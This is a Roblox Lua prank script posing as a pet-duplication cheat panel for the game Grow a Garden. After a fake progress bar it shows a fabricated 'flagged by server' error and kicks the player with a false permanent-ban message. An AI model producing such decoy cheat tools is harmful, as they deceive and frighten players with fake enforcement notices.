-- YexScript Dupe Troll by @YexxDev

local plr = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
gui.Name = "YexScript_DupeTroll"
gui.ResetOnSpawn = false

-- Main Dupe Box UI
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0.35, 0, 0.28, 0)
frame.Position = UDim2.new(0.325, 0, 0.36, 0)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0

-- Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0.25, 0)
title.Text = "🛠️ YexScript Dupe Panel"
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 20

-- Pet Name Input
local input = Instance.new("TextBox", frame)
input.PlaceholderText = "Enter Pet Name (e.g. Candy Blossom)"
input.Size = UDim2.new(0.8, 0, 0.25, 0)
input.Position = UDim2.new(0.1, 0, 0.35, 0)
input.Font = Enum.Font.Gotham
input.TextSize = 16
input.TextColor3 = Color3.new(1, 1, 1)
input.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

-- Dupe Button
local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.new(0.5, 0, 0.25, 0)
btn.Position = UDim2.new(0.25, 0, 0.7, 0)
btn.Text = "Dupe"
btn.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
btn.Font = Enum.Font.GothamBold
btn.TextSize = 18
btn.TextColor3 = Color3.new(1, 1, 1)

-- On Press: Start Fake Loading
btn.MouseButton1Click:Connect(function()
    local petName = input.Text
    gui:ClearAllChildren()

    -- Loading Screen
    local loadFrame = Instance.new("Frame", gui)
    loadFrame.Size = UDim2.new(1, 0, 1, 0)
    loadFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

    -- Header
    local header = Instance.new("TextLabel", loadFrame)
    header.Size = UDim2.new(1, 0, 0.1, 0)
    header.Position = UDim2.new(0, 0, 0.15, 0)
    header.Text = "🔄 Duplicating Pet: " .. petName
    header.TextColor3 = Color3.new(1, 1, 1)
    header.BackgroundTransparency = 1
    header.Font = Enum.Font.GothamBold
    header.TextSize = 22

    -- Middle Text (Fake System Name)
    local brand = Instance.new("TextLabel", loadFrame)
    brand.Size = UDim2.new(1, 0, 0.1, 0)
    brand.Position = UDim2.new(0, 0, 0.45, 0)
    brand.Text = "🧠 YexScript Duplication Engine"
    brand.TextColor3 = Color3.fromRGB(100, 255, 100)
    brand.BackgroundTransparency = 1
    brand.Font = Enum.Font.GothamBold
    brand.TextSize = 20

    -- Progress Bar Frame
    local barBG = Instance.new("Frame", loadFrame)
    barBG.Size = UDim2.new(0.6, 0, 0.03, 0)
    barBG.Position = UDim2.new(0.2, 0, 0.6, 0)
    barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

    local bar = Instance.new("Frame", barBG)
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    bar.BorderSizePixel = 0

    -- Animate Loading
    for i = 1, 100 do
        bar.Size = UDim2.new(i / 100, 0, 1, 0)
        wait(0.03)
    end

    wait(1)

    -- Fake Fail + Kick
    header.Text = "❌ Dupe Failed: Pet flagged by server!"
    brand.Text = "🚫 Unauthorized duplication attempt"
    bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

    wait(2.5)

    plr:Kick("❌ You have been permanently banned from Grow a Garden for unauthorized duplication.")
end)
